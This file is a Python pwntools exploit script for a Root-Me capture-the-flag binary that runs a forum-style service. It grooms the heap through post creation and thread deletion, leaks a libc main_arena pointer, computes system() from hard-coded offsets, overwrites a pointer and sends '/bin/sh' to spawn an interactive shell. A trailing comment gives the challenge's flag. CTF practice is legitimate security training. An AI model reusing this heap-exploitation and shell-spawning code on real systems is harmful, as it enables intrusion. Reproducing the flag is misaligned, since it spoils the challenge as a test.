#!/usr/bin/python

from model import *
from pwn import *

import binascii
import time
import sys
import os


if len(sys.argv)>1:
    if len(sys.argv)>2:
        p = process(['./bin'], aslr=False)
        gdb.attach(p)
    else:
        p = process(['./bin'])
    debug = True
else:
    p = remote('challenge03.root-me.org', '56561')
    debug = False


model = Model(p)
model.go_until_cur()

print(model.add_user("a", "b"))
print(model.login("a", "b"))

print(model.create_thread("a"))
print(model.create_post("a", "AAAAAAAAAAA", "red", 0x60))
print(model.create_post("a", "BBBBBBBBBBB", "cyan", 0x80))
print(model.delete_thread("a"))
print(model.create_thread("a"))
print(model.create_post("a", "CCCCCCCCCC", "mdrnul", 0x30))
print(model.create_post("a", "CCCCDDD", "mdrnul", 0x30))

leaked = model.list_posts("a")[0].split('[1][')[1].split('] a')[0]
print "============================================"
print "=== We leaked main arena : "+binascii.hexlify(leaked)
print "============================================"
print ""

open('test_instructions', 'wb').write('\n'.join(model.instructions_until_now()))

if debug:
    offset_libc = 0x37f7e8
else:
    offset_libc = 0x378228

libc_system = u64(leaked+"\x00"*(8-len(leaked)))-offset_libc
print "Libc system is at "+hex(libc_system)

print(model.logout())
print(model.login("a", "b"))

print(model.create_thread("a"))
print(model.create_post("a", "A"*40+p64(libc_system), "red", 0x60))
print(model.create_post("a", "BBBBBBBBBBB", "cyan", 0x80))
print(model.delete_thread("a"))
print(model.create_thread("a"))
print(model.create_post("a", "CCCCCCCCCC", "mdrnul", 0x30))
print(model.create_post("a", "/bin/sh", "mdrnul", 0x30))
print(model.list_posts("a"))

p.interactive()

#0n3_Mor3_M1lest0ne_tO_aDd_t0_y0uR_sKiLlz_y0u_H4ckx0r
